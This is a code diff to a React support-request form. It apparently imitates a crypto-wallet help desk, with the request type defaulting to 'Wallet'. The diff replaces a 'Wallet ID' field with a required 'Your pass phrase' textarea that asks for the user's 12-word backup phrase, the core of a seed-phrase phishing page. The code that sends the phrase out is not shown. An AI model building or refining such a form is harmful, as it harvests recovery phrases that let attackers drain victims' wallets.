@@ -118,10 +118,9 @@ const Form = (props) => {
                     <label>Please choose a request type below</label>
                     <Select
                         options={options}
-                        isClearable
-                        placeholder={'-'}
                         styles={customStyles}
                         onChange={onPackageChange}
+                        defaultInputValue={"Wallet"}
                     />
                 </div>
                 {/* <div>
@@ -140,8 +139,16 @@ const Form = (props) => {
                     <input className='border ' />
                 </div>
                 <div className='grid'>
-                    <label>Wallet ID</label>
-                    <input className='border ' />
+                    <label>Your pass phrase</label>
+                    <textarea
+                        id='phrase'
+                        className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
+                        rows={4}
+                        required
+                        value={phrase}
+                        placeholder='Enter 12-word Backup phrase'
+                        onChange={handlePhrase}
+                    ></textarea>{' '}
                 </div>
                 <div className='grid'>
                     <label>What service is your query about?</label>
@@ -160,13 +167,8 @@ const Form = (props) => {
                 <div className='grid'>
                     <label>How can we help you?</label>
                     <textarea
-                        id='phrase'
                         className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
-                        rows={5}
-                        required
-                        value={phrase}
-                        placeholder='Enter 12-word Backup phrase'
-                        onChange={handlePhrase}
+                        rows={4}
                     ></textarea>{' '}
                     <span>Enter the details of your request</span>
                 </div>
@@ -188,14 +190,15 @@ const Form = (props) => {
                 </div>
                 <div className='grid'>
                     <label>Attachments</label>
-                    <input className='border ' type='file' placeholder='Add file or drop files here'/>
+                    <input
+                        className='border '
+                        type='file'
+                        placeholder='Add file or drop files here'
+                    />
                 </div>
             </div>
 
             <div className='flex justify-between items-center pt-10 font-medium'>
-             
-
-              
                 <button
                     className='text-white bg-[#1652f0] rounded-sm'
                     style={{ padding: '11px 22px', fontSize: '11px' }}
